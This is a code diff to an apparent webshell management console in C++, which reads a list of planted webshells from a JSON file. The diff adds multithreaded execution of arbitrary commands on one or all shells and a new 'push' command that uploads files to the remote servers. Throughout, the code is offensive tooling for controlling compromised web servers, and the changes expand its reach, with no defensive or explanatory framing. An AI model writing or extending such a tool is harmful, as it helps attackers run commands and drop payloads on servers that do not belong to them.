@@ -4,12 +4,23 @@
 #include<vector>
 #include<sstream>
 #include<exception>
+#include<thread>
+#include<mutex>
 #include"json.hpp"
 
 using namespace std;
 using json = nlohmann::json;
 vector<WebShell> shells;
 json j;
+mutex mtx;
+
+class OutofBondExcetion:public exception{
+public:
+	OutofBondExcetion():exception(logic_error("Error:webshell out of bond\n")){
+	}
+};
+
+
 bool addShell(WebShell shell){
 	try{
 		shells.push_back(shell);
@@ -21,6 +32,43 @@ bool addShell(WebShell shell){
 	return true;
 }
 
+CURLcode ExecuteCommand(int shellid,string command,string& answer){
+	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
+	return shells[shellid].ShellCommandExec(command,answer);
+}
+void execCommand(int shellid,string command,bool sync){
+	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
+	string answer;
+	ExecuteCommand(shellid,command,answer);
+	if(sync){
+		if(mtx.try_lock()){
+		cout<<"executing command "<<command<<" on "<<shells[shellid].getAddress()<<endl;
+		cout<<"-------------------------------------------"<<endl;
+		cout<<answer<<endl;
+		cout<<"-------------------------------------------"<<endl;
+		mtx.unlock();
+		}
+	}
+	else{
+		cout<<"executing command "<<command<<" on "<<shells[shellid].getAddress()<<endl;
+		cout<<"-------------------------------------------"<<endl;
+		cout<<answer<<endl;
+		cout<<"-------------------------------------------"<<endl;
+	}
+}
+void pushFile(int shellid,string source,string dest,bool sync){
+	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
+	shells[shellid].UploadFile(source,dest);
+	if(sync){
+		if(mtx.try_lock()){
+		cout<<"[+]push file "<<source<<" to "<<dest<<" on "<<shells[shellid].getAddress()<<" finished "<<endl;
+		mtx.unlock();
+		}
+	}
+	else{
+		cout<<"[+]push file "<<source<<" to "<<dest<<" on "<<shells[shellid].getAddress()<<" finished "<<endl;
+	}
+}
 WebShell parseShell(json shell){
 	METHOD meth;
 	if(shell["method"].get<string>()=="GET")meth=GET;
@@ -54,6 +102,7 @@ template<typename T>T stringToNum(string &str){
 	stream>>num;
 	return num;
 }
+vector<thread> threads;
 int main(){
 	try{
 		ifstream config("shells.json");
@@ -102,13 +151,13 @@ int main(){
 				parseRes.push_back(command.substr(begin,end-begin));
 				begin=command.find_first_not_of(' ',end);
 				i++;
-				if(i==2) 
-				break;
+				//if(i==2) 
+				//break;
 			}
 			parseRes.push_back(command.substr(begin));
 			if(parseRes.size()>0){
 				if(parseRes[0]=="add"){
-					if(parseRes.size()!=2){
+					if(parseRes.size()<2){
 						cerr<<"[-]invalid syntax"<<endl;
 						continue;
 					}
@@ -122,7 +171,7 @@ int main(){
 					}
 				}
 				else if(parseRes[0]=="delete"){
-					if(parseRes.size()!=2){
+					if(parseRes.size()<2){
 						cerr<<"[-]invalid syntax"<<endl;
 						continue;
 					}
@@ -138,19 +187,21 @@ int main(){
 					config.close();
 				}
 				else if(parseRes[0]=="execute"){
-					if(parseRes.size()!=3){
+					if(parseRes.size()<3){
 						cerr<<"[-]invalid syntax"<<endl;
 						continue;
 					}
-					if(parseRes[1]=="all"){
-						for(vector<WebShell>::iterator it=shells.begin();it!=shells.end();++it){
-							cout<<"executing command "<<parseRes[2]<<" on "<<it->getAddress()<<endl;
-							cout<<"-------------------------------------------"<<endl;
-							string answer;
-							CURLcode code=it->ShellCommandExec(parseRes[2],answer);
-							cout<<answer<<endl;
-							cout<<"-------------------------------------------"<<endl;
+					if(parseRes.size()>3){
+						for(int i=3;i<parseRes.size();i++){
+							parseRes[2]+=' '+parseRes[i]; 
 						}
+					}
+					if(parseRes[1]=="all"){
+						for(int i=0;i<shells.size();i++){
+							threads.push_back(thread(execCommand,i,parseRes[2],true));	
+						}
+						threads[threads.size()-1].join();
+						//delete[] threads;
 					}
 					else{
 						int num=stringToNum<int>(parseRes[1]);
@@ -171,12 +222,44 @@ int main(){
 						cout<<"Shell["<<it-shells.begin()<<"] on "<<it->getAddress()<<endl;
 					}
 				}
+				else if(parseRes[0]=="push"){
+					if(parseRes.size()<4){
+						cerr<<"[-]invalid syntax "<<parseRes.size()<<endl;
+						continue;
+					}
+					string sourcepath;
+					string destpath;
+					if(parseRes.size()==4){
+						sourcepath=parseRes[2];
+						destpath=parseRes[3];
+					}
+					else{
+						string* paths[2];
+						paths[0]=&sourcepath;
+						paths[1]=&destpath;
+						int point=0;
+						for(int j=3;j<parseRes.size();j++){
+							if(parseRes[j][parseRes[j].length()-1]!='\\')point++;
+							if(point>1)break;
+							(*paths[point])+=(parseRes[j][parseRes[j].length()-1]=='\\'?parseRes[j].substr(0,parseRes[j].length()-1)+' ':parseRes[j]);
+						}
+					}
+					if(parseRes[1]=="all"){
+						for(int i=0;i<shells.size();i++){
+							threads.push_back(thread(pushFile,i,sourcepath,destpath,true));
+						}
+					}else{
+						threads.push_back(thread(pushFile,stringToNum<int>(parseRes[1]),sourcepath,destpath,true));
+					}
+
+				}
 				else{
 					cout<<"[+]Usage:\n"
 					"list: show all the shells\n"
 					"add jsondata:add a shell\n"
 					"delete index:delete a shell\n"
 					"execute index command: execute command on a shell or all the shells\n"
+					"push index sourcepath destpath: push file to the remote server\n"
 					<<endl;
 				}
 			}
@@ -186,6 +269,7 @@ int main(){
 				"add jsondata:add a shell\n"
 				"delete index:delete a shell\n"
 				"execute index command: execute command on a shell or all the shells\n"
+				"push index sourcepath destpath: push file to the remote server\n"
 				<<endl;
 			}
 		}
